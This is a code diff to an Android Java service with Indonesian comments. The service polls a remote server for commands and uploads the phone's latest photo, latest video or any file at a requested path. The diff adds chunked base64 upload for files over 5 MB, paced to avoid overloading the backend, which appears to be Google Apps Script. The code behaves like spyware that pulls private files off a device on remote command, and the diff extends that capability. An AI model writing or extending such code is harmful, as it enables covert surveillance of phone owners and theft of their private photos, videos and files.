@@ -164,13 +164,13 @@ public class FilePollingService extends Service {
 
                     case "lastphoto": {
                         FileHelper.FileResult res = FileHelper.getLatestPhoto(ctx);
-                        ApiHelper.sendFileResult(requestId, operation, res);
+                        sendFileOrChunks(requestId, operation, res);
                         break;
                     }
 
                     case "lastvideo": {
                         FileHelper.FileResult res = FileHelper.getLatestVideo(ctx);
-                        ApiHelper.sendFileResult(requestId, operation, res);
+                        sendFileOrChunks(requestId, operation, res);
                         break;
                     }
 
@@ -188,7 +188,7 @@ public class FilePollingService extends Service {
 
                     case "getfile": {
                         FileHelper.FileResult res = FileHelper.getFileByPath(params);
-                        ApiHelper.sendFileResult(requestId, operation, res);
+                        sendFileOrChunks(requestId, operation, res);
                         break;
                     }
 
@@ -211,6 +211,61 @@ public class FilePollingService extends Service {
             scheduleNextPoll(POLL_AFTER_UPLOAD_MS);
 
         }).start();
+    }
+
+    // =========================================================
+    // KIRIM FILE (single atau chunked)
+    // =========================================================
+
+    private void sendFileOrChunks(
+            String requestId,
+            String operation,
+            FileHelper.FileResult res) {
+
+        if (!res.isChunked) {
+            // File ≤ 5 MB atau error — kirim sekaligus
+            ApiHelper.sendFileResult(requestId, operation, res);
+            return;
+        }
+
+        // File > 5 MB — kirim per chunk
+        Log.d(TAG, "Chunked upload: " + res.name
+                + " total=" + res.totalChunks + " chunks");
+
+        for (int i = 0; i < res.totalChunks; i++) {
+
+            String chunkBase64 = FileHelper.readChunkToBase64(res.path, i);
+
+            if (chunkBase64 == null) {
+                Log.e(TAG, "Gagal baca chunk " + i + " dari " + res.path);
+                ApiHelper.updateFileRequestStatus(requestId, "CHUNK_READ_FAILED");
+                return;
+            }
+
+            boolean ok = ApiHelper.sendFileChunk(
+                    requestId,
+                    operation,
+                    res.name,
+                    res.mimeType,
+                    res.size,
+                    i,
+                    res.totalChunks,
+                    chunkBase64
+            );
+
+            if (!ok) {
+                Log.e(TAG, "Gagal kirim chunk " + i);
+                ApiHelper.updateFileRequestStatus(requestId, "CHUNK_SEND_FAILED");
+                return;
+            }
+
+            Log.d(TAG, "Chunk " + (i + 1) + "/" + res.totalChunks + " terkirim");
+
+            // Jeda singkat antar chunk supaya GAS tidak overwhelmed
+            try { Thread.sleep(300); } catch (InterruptedException ignored) {}
+        }
+
+        Log.d(TAG, "Semua chunk terkirim: " + res.name);
     }
 
     // =========================================================
